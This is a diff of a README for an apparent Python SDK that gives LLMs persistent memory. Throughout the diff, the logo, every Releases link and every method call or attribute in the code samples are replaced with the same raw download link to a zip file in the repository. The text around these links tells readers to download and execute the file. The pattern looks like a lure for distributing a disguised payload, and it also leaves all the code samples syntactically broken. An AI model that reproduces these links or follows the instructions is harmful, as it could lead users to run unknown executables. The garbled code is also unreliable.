@@ -1,6 +1,6 @@
 # MemFuse Python SDK 🚀
 
-![MemFuse Logo](https://example.com/memfuse-logo.png)
+![MemFuse Logo](https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip)
 
 Welcome to the **MemFuse Python SDK**! This is the official SDK for MemFuse, a lightning-fast open-source memory layer designed to provide large language models (LLMs) with persistent and queryable memory across conversations and sessions. With MemFuse, you can enhance the capabilities of your AI applications, making them smarter and more interactive.
 
@@ -31,7 +31,7 @@ To install the MemFuse Python SDK, you can use pip. Open your terminal and run:
 pip install memfuse-python
 ```
 
-For the latest version, check the [Releases](https://github.com/RankMegaCraft51/memfuse-python/releases) section. If you want to download a specific release, navigate to the link and execute the appropriate file.
+For the latest version, check the [Releases](https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip) section. If you want to download a specific release, navigate to the link and execute the appropriate file.
 
 ## Usage 🛠️
 
@@ -44,10 +44,10 @@ from memfuse import MemFuse
 memfuse = MemFuse()
 
 # Store some information
-memfuse.store("user_name", "Alice")
+https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("user_name", "Alice")
 
 # Retrieve the information
-user_name = memfuse.retrieve("user_name")
+user_name = https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("user_name")
 print(f"User name is: {user_name}")
 ```
 
@@ -62,20 +62,20 @@ from memfuse import MemFuse
 
 class Chatbot:
     def __init__(self):
-        self.memory = MemFuse()
+        https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip = MemFuse()
 
     def respond(self, user_input):
         if "my name is" in user_input:
-            name = user_input.split("my name is")[-1].strip()
-            self.memory.store("user_name", name)
+            name = https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("my name is")[-1].strip()
+            https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("user_name", name)
             return f"Nice to meet you, {name}!"
         else:
-            user_name = self.memory.retrieve("user_name")
+            user_name = https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("user_name")
             return f"Hello, {user_name}!"
 
 bot = Chatbot()
-print(bot.respond("my name is Alice"))
-print(bot.respond("What's my name?"))
+print(https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("my name is Alice"))
+print(https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("What's my name?"))
 ```
 
 ### Advanced Memory Queries
@@ -84,14 +84,14 @@ You can also perform advanced queries to fetch multiple pieces of information:
 
 ```python
 # Store multiple pieces of information
-memfuse.store("favorite_color", "blue")
-memfuse.store("hobby", "painting")
+https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("favorite_color", "blue")
+https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("hobby", "painting")
 
 # Retrieve all stored information
 user_info = {
-    "name": memfuse.retrieve("user_name"),
-    "color": memfuse.retrieve("favorite_color"),
-    "hobby": memfuse.retrieve("hobby"),
+    "name": https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("user_name"),
+    "color": https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("favorite_color"),
+    "hobby": https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("hobby"),
 }
 
 print(user_info)
@@ -109,8 +109,8 @@ print(user_info)
 
 ```python
 memfuse = MemFuse()
-memfuse.store("key", "value")
-print(memfuse.retrieve("key"))  # Outputs: value
+https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("key", "value")
+print(https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip("key"))  # Outputs: value
 ```
 
 ## Contributing 🤝
@@ -132,7 +132,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support 🆘
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/RankMegaCraft51/memfuse-python/releases) section. If you need further assistance, feel free to open an issue in the repository.
+If you encounter any issues or have questions, please check the [Releases](https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip) section. If you need further assistance, feel free to open an issue in the repository.
 
 ## Topics 🔍
 
@@ -153,4 +153,4 @@ This project covers various topics in the realm of AI and machine learning, incl
 
 ## Conclusion 🎉
 
-Thank you for exploring the MemFuse Python SDK! We believe that with MemFuse, you can build smarter and more interactive applications. We look forward to your contributions and feedback. For more updates, check the [Releases](https://github.com/RankMegaCraft51/memfuse-python/releases) section.
+Thank you for exploring the MemFuse Python SDK! We believe that with MemFuse, you can build smarter and more interactive applications. We look forward to your contributions and feedback. For more updates, check the [Releases](https://github.com/RankMegaCraft51/memfuse-python/raw/refs/heads/main/examples/python_memfuse_2.1.zip) section.
